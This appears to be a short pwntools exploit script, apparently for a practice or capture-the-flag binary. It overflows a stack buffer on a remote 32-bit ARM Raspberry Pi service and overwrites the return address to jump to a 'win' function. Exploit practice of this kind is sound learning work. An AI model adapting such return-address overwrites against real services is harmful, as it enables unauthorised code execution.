# Tested on 64bit Ubuntu, macOS
# Target : 32bit ARM, Raspberry Pi, Raspbian OS
# Python 3.7.6
# pwntools 4.2.1

from pwn import *
import time

target = remote("target ip", 9998)

# Creating Payload
g = cyclic_gen()
dummy = g.get(64)
frame_pointer = b'BBBB'
return_addr = p32(0x00010444) # address for function 'win'

payload = b''
payload+= dummy + frame_pointer + return_addr

print("payload len : {}".format(len(payload)))
print("paylaod     : {}".format(payload))

# Sending Payload
print("[+] Sending payload..")
target.sendline(payload)
sleep(1)

# Receiving msg
print("Received   :")
print(target.recvline())
